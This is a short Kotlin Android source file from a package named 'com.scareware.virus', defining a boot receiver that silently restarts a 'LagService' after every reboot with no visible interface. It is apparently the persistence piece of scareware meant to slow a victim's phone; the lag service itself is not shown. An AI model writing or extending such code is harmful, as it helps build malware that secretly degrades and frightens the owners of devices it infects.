package com.scareware.virus

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build

/** After reboot: start lag service silently (no UI) */
class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        if (intent?.action == Intent.ACTION_BOOT_COMPLETED) {
            val svc = Intent(context, LagService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(svc)
            } else {
                context.startService(svc)
            }
        }
    }
}
